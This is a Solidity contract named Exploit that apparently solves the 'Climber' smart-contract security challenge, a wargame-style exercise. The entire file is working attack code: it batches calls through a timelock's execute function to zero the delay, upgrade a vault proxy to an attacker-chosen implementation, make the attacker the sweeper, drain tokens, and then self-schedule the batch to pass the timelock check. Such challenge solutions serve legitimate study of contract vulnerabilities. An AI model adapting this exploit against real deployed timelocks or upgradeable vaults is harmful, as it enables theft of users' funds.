// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract Exploit {
    ClimberTimelock timelock;
    ClimberVault vault;
    address attacker;
    address tokenAddress;
    uint256 amount;
    address vault2;
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    constructor(
        address _timelock,
        address _vault,
        address _attacker,
        address _token,
        uint256 _amount,
        address _vault2
    ) {
        timelock = ClimberTimelock(payable(_timelock));
        vault = ClimberVault(payable(_vault));
        attacker = _attacker;
        tokenAddress = _token;
        amount = _amount;
        vault2 = _vault2;
    }

    // function execute(
    //     address[] calldata targets, //contracts
    //     uint256[] calldata values, //parameterse
    //     bytes[] calldata dataElements,  //function signature
    //     bytes32 salt

    function exploit() external {
        bytes32 salt = 0;
        address[] memory contracts = new address[](6);
        contracts[0] = address(timelock);
        contracts[1] = address(vault);
        contracts[2] = address(vault);
        contracts[3] = address(vault);
        contracts[4] = address(timelock);
        contracts[5] = address(timelock);

        uint256[] memory value = new uint256[](6);

        bytes[] memory functionSigs = new bytes[](6);

        functionSigs[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        functionSigs[1] = abi.encodeWithSignature("upgradeTo(address)", address(vault2));
        functionSigs[2] = abi.encodeWithSignature("setSweeper(address)", address(attacker));
        functionSigs[3] = abi.encodeWithSignature("sweepFunds(address)", address(tokenAddress));
        functionSigs[4] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(timelock)
        );

        functionSigs[5] = abi.encodeWithSignature(
            "schedule(address[],uint256[],bytes[],bytes32)",
            contracts,
            value,
            functionSigs,
            salt
        );

        timelock.execute(contracts, value, functionSigs, salt);
    }
}
